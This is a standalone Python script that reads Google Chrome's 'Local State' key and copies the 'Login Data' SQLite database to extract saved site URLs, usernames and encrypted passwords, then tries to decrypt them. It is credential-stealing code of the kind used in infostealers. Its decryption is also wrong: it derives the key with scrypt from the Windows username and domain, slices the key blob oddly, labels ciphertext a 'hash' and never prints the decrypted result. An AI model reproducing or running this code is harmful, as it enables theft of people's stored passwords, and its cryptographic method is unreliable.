import os
import json
import base64
import sqlite3
from Crypto.Cipher import AES
from Crypto.Protocol.KDF import scrypt
from datetime import datetime, timedelta
import shutil

def chrome_date_and_time(chrome_data):
    return datetime(1601, 1, 1) + timedelta(microseconds=chrome_data)

local_computer_directory_path = os.path.join(
    os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome",
    "User Data", "Local State"
)

with open(local_computer_directory_path, "r", encoding="utf-8") as f:
    local_state_data = f.read()
    local_state_data = json.loads(local_state_data)

encrypted_key = base64.b64decode(local_state_data["os_crypt"]["encrypted_key"])
nonce = encrypted_key[3:15]
encrypted_key = encrypted_key[15:]

password = os.getenv("USERNAME") + os.getenv("USERDOMAIN")
encryption_key = scrypt(password.encode(), nonce, 32, N=2**14, r=8, p=1)

cipher = AES.new(encryption_key, AES.MODE_GCM, nonce=nonce)

db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                       "Google", "Chrome", "User Data", "default", "Login Data")
filename = "ChromePasswords.db"
shutil.copyfile(db_path, filename)

db = sqlite3.connect(filename)
cursor = db.cursor()

cursor.execute(
    "select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins "
    "order by date_last_used")

for row in cursor.fetchall():
    main_url = row[0]
    login_page_url = row[1]
    user_name = row[2]
    encrypted_password = row[3]
    decrypted_password = None
    try:
        iv = encrypted_password[3:15]
        tag = encrypted_password[-16:]
        ciphertext = encrypted_password[15:-16]

        cipher = AES.new(encryption_key, AES.MODE_GCM, nonce=iv)
        decrypted_password = cipher.decrypt_and_verify(ciphertext, tag)
        decrypted_password = decrypted_password.decode('utf-8')
    except Exception as e:
        decrypted_password = f"Error decrypting password: {str(e)}"

    date_of_creation = row[4]
    last_usage = row[5]

    print(f"Main URL: {main_url}")
    print(f"Login URL: {login_page_url}")
    print(f"User name: {user_name}")
    print(f"Password Hash: {encrypted_password}")

    if date_of_creation != 86400000000 and date_of_creation:
        print(f"Creation date: {str(chrome_date_and_time(date_of_creation))}")

    if last_usage != 86400000000 and last_usage:
        print(f"Last Used: {str(chrome_date_and_time(last_usage))}")

    print("=" * 100)


cursor.close()
db.close()

try:
    os.remove(filename)
except:
    pass
